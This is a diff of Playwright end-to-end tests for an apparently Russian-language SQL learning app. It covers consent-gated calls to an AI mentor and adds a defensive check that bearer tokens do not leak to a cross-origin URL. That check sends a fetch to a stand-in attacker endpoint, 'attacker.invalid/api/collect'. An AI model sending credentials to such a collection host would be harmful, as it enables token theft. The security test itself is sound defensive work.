@@ -16,6 +16,7 @@ const replaceEditorSql = async (page: import('@playwright/test').Page, sql: stri
 };
 
 const mockMentorWithoutUsingQuota = async (page: import('@playwright/test').Page) => {
+  let requests = 0;
   await page.route('**/api/mentor', async route => {
     const origin = route.request().headers().origin || '*';
     const headers = {
@@ -28,19 +29,28 @@ const mockMentorWithoutUsingQuota = async (page: import('@playwright/test').Page
       await route.fulfill({ status: 204, headers });
       return;
     }
+    requests += 1;
     await route.fulfill({
       status: 200,
       headers,
-      body: JSON.stringify({ answer: 'Концепт\n• Сначала сформулируй ожидаемые строки.\n• Затем проверь WHERE и ORDER BY.' })
+      body: JSON.stringify({
+        answer: 'Концепт\n• Сначала сформулируй ожидаемые строки.\n• Затем проверь WHERE и ORDER BY.',
+        source: 'workers-ai',
+        reason: 'provider-response',
+        remaining: 19,
+        exampleStatus: 'none',
+        masteryAwarded: false
+      })
     });
   });
+  return () => requests;
 };
 
 test('desktop academy workflow is usable and shares the authenticated Cloudflare API', async ({ page }, testInfo) => {
   const pageErrors: string[] = [];
   page.on('pageerror', error => pageErrors.push(error.message));
   await authenticatePage(page, 'desktop-academy');
-  await mockMentorWithoutUsingQuota(page);
+  const mentorRequests = await mockMentorWithoutUsingQuota(page);
 
   await page.goto('./');
   await expect(page.getByTestId('guided-first-run')).toBeVisible();
@@ -81,10 +91,42 @@ test('desktop academy workflow is usable and shares the authenticated Cloudflare
 
   await page.locator('.mentor-panel').getByRole('button', { name: 'Объяснить тему' }).click();
   await expect(page.locator('.mentor-panel .mentor-answer')).toContainText('Концепт');
+  await expect(page.getByTestId('mentor-source')).toContainText('Локальная подсказка');
+  expect(mentorRequests()).toBe(0);
+  await page.locator('.mentor-panel').getByRole('checkbox', { name: /Разрешить Cloudflare Workers AI/ }).check();
+  await page.locator('.mentor-panel').getByRole('button', { name: 'Объяснить тему' }).click();
+  await expect(page.getByTestId('mentor-source')).toContainText('Cloudflare Workers AI');
+  expect(mentorRequests()).toBe(1);
   await expectNoHorizontalOverflow(page);
 
   await page.screenshot({ path: testInfo.outputPath('desktop-academy.png'), fullPage: true });
   expect(pageErrors).toEqual([]);
+});
+
+test('desktop academy never leaks bearer credentials to a cross-origin api-shaped URL', async ({ page }) => {
+  await authenticatePage(page, 'origin-leak');
+  let leakedAuthorization = '';
+  await page.route('https://attacker.invalid/api/collect', async route => {
+    leakedAuthorization = route.request().headers().authorization || '';
+    await route.fulfill({
+      status: 200,
+      headers: { 'access-control-allow-origin': '*', 'content-type': 'application/json' },
+      body: JSON.stringify({ ok: true })
+    });
+  });
+
+  await page.goto('./');
+  const storage = await page.evaluate(async () => {
+    await fetch('https://attacker.invalid/api/collect');
+    return {
+      metadata: localStorage.getItem('sql-academy-auth-session-v2') || '',
+      ephemeralTokenPresent: Boolean(sessionStorage.getItem('sql-academy-auth-token-v1'))
+    };
+  });
+
+  expect(leakedAuthorization).toBe('');
+  expect(storage.metadata).not.toContain('"token"');
+  expect(storage.ephemeralTokenPresent).toBe(true);
 });
 
 test('mobile task flow uses four product actions and list-to-editor navigation after login', async ({ page }, testInfo) => {
@@ -114,6 +156,12 @@ test('mobile task flow uses four product actions and list-to-editor navigation a
   await expect(page.locator('.monaco-editor')).toBeVisible();
   await expect(page.getByRole('button', { name: /Проверить SQL/ })).toBeEnabled();
   await expect(page.getByRole('button', { name: 'К списку' })).toBeVisible();
+  const mentorConsent = page.locator('.mentor-panel').getByRole('checkbox', { name: /Разрешить Cloudflare Workers AI/ });
+  await mentorConsent.scrollIntoViewIfNeeded();
+  await expect(mentorConsent).toBeVisible();
+  await expect(page.getByTestId('mentor-source')).toContainText('Локальная подсказка');
+  await mentorConsent.check();
+  await expect(mentorConsent).toBeChecked();
 
   await page.getByRole('button', { name: 'Развернуть редактор' }).click();
   await expect(page.locator('.editor-panel')).toHaveClass(/fullscreen/);
